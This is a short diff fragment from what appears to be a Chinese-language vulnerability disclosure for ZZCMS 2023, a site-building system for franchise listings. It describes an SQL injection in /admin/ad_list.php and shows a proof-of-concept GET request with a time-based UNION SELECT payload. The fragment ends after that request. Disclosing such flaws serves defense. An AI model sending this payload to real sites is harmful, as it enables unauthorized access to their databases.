@@ -2,7 +2,7 @@
 
 ZZCMS 2023是一款快速建站系统，产品招商模板程序源码，可以快速搭建产品招商网。例如医药招商、保健品招商、化妆品招商、农产品招商、孕婴童招商、酒类副食品等。 /admin/ad_list.php组件中关键字过滤导致sql注入漏洞
 
-## poc
+## POC
 
 ```javascript
 GET /admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(5)+--+x HTTP/1.1
